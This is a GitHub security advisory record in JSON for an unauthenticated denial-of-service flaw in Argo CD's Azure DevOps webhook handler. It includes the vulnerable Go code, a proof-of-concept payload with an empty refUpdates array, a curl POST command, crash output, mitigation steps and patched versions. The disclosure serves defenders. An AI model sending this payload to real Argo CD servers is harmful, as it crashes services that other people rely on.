{
  "Severity": "HIGH",
  "UpdatedAt": "2025-09-30T18:32:32Z",
  "Package": {
    "Ecosystem": "GO",
    "Name": "github.com/argoproj/argo-cd/v3"
  },
  "Advisory": {
    "DatabaseId": 314540,
    "Id": "GSA_kwCzR0hTQS1ncHg0LTM3ZzItYzhwds4ABMys",
    "GhsaId": "GHSA-gpx4-37g2-c8pv",
    "References": [
      {
        "Url": "https://github.com/argoproj/argo-cd/security/advisories/GHSA-gpx4-37g2-c8pv"
      },
      {
        "Url": "https://github.com/argoproj/argo-cd/commit/1a023f1ca7fe4ec942b4b6696804988d5a632baf"
      },
      {
        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2025-59538"
      },
      {
        "Url": "https://github.com/advisories/GHSA-gpx4-37g2-c8pv"
      }
    ],
    "Identifiers": [
      {
        "Type": "GHSA",
        "Value": "GHSA-gpx4-37g2-c8pv"
      },
      {
        "Type": "CVE",
        "Value": "CVE-2025-59538"
      }
    ],
    "Description": "### Summary\n\nIn the default configuration, `webhook.azuredevops.username` and `webhook.azuredevops.password` not set, Argo CD’s /api/webhook endpoint crashes the entire argocd-server process when it receives an Azure DevOps Push event whose JSON array resource.refUpdates is empty.\n\nThe slice index [0] is accessed without a length check, causing an index-out-of-range panic.\n\nA single unauthenticated HTTP POST is enough to kill the process.\n\n### Details\n\n```go\ncase azuredevops.GitPushEvent:\n    // util/webhook/webhook.go -- line ≈147\n    revision        = ParseRevision(payload.Resource.RefUpdates[0].Name)        // panics if slice empty\n    change.shaAfter = ParseRevision(payload.Resource.RefUpdates[0].NewObjectID)\n    change.shaBefore= ParseRevision(payload.Resource.RefUpdates[0].OldObjectID)\n    touchedHead     = payload.Resource.RefUpdates[0].Name ==\n                      payload.Resource.Repository.DefaultBranch\n```\n\nIf the attacker supplies \"refUpdates\": [], the slice has length 0.\n\nThe webhook code has no recover(), so the panic terminates the entire binary.\n\n### PoC\n\npayload-azure-empty.json:\n```json\n{\n  \"eventType\": \"git.push\",\n  \"resource\": {\n    \"refUpdates\": [],\n    \"repository\": {\n      \"remoteUrl\": \"https://example.com/dummy\",\n      \"defaultBranch\": \"refs/heads/master\"\n    }\n  }\n}\n```\n\ncurl call:\n\n```shell\ncurl -k -X POST https://argocd.example.com/api/webhook \\\n     -H 'X-Vss-ActivityId: 11111111-1111-1111-1111-111111111111' \\\n     -H 'Content-Type: application/json' \\\n     --data-binary @payload-azure-empty.json\n```\n\nObserved crash:\n\n```\npanic: runtime error: index out of range [0] with length 0\n\ngoroutine 205 [running]:\ngithub.com/argoproj/argo-cd/v3/util/webhook.affectedRevisionInfo\n    webhook.go:147 +0x1ea5\n...\n```\n\n### Mitigation\n\nIf you use Azure DevOps and need to handle webhook events, configure a webhook secret to ensure only trusted parties can invoke the webhook handler.\n\nIf you do not use Azure DevOps, you can set the webhook secrets to long, random values to effectively disable webhook handling for Azure DevOps payloads.\n\n```diff\napiVersion: v1\nkind: Secret\nmetadata:\n  name: argocd-secret\ntype: Opaque\ndata:\n+  webhook.azuredevops.username: \u003cyour base64-encoded secret here\u003e\n+  webhook.azuredevops.password: \u003cyour base64-encoded secret here\u003e\n```\n\n### For more information\n\n* Open an issue in [the Argo CD issue tracker](https://github.com/argoproj/argo-cd/issues) or [discussions](https://github.com/argoproj/argo-cd/discussions)\n* Join us on [Slack](https://argoproj.github.io/community/join-slack) in channel #argo-cd\n\n### Credits\n\nDiscovered by Jakub Ciolek at AlphaSense.",
    "Origin": "UNSPECIFIED",
    "PublishedAt": "2025-09-30T18:32:31Z",
    "Severity": "HIGH",
    "Summary": "Argo CD Unauthenticated Remote DoS via malformed Azure DevOps git.push webhook",
    "UpdatedAt": "2025-10-01T21:37:25Z",
    "WithdrawnAt": "",
    "CVSS": {
      "Score": 7.5,
      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
    }
  },
  "Versions": [
    {
      "FirstPatchedVersion": {
        "Identifier": "3.0.19"
      },
      "VulnerableVersionRange": "\u003e= 3.0.0-rc1, \u003c= 3.0.18"
    },
    {
      "FirstPatchedVersion": {
        "Identifier": "3.1.8"
      },
      "VulnerableVersionRange": "\u003e= 3.1.0-rc1, \u003c= 3.1.7"
    },
    {
      "FirstPatchedVersion": {
        "Identifier": "3.2.0-rc2"
      },
      "VulnerableVersionRange": "= 3.2.0-rc1"
    }
  ]
}